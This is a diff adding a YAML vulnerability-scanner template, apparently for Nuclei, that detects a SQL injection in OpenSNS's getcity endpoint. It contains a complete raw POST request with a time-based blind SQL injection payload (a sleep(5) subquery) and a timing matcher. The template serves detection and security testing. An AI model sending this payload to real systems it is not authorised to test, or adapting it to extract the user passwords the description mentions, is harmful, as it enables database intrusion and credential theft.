@@ -1,0 +1,31 @@
+id: OpenSNS-getcity-sqli
+
+info:
+  name: OpenSNS-getcity-sqli
+  author: apple
+  severity: high
+  description: OpenSNS ChinaCityController.class.php文件中，可通过拼接SQL语句执行任意SQL命令，获取用户账号密码
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS漏洞/OpenSNS%20ChinaCityController.class.php%20SQL注入漏洞.md
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS漏洞/OpenSNS%20AuthorizeController.class.php%20后台远程命令执行漏洞.md
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 80
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: keep-alive
+        Cache-Control: max-age=0
+
+        cid=0&pid[0]==(select*from(select+sleep(5)union/**/select+1)a)and+1+in+&pid[1]=1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
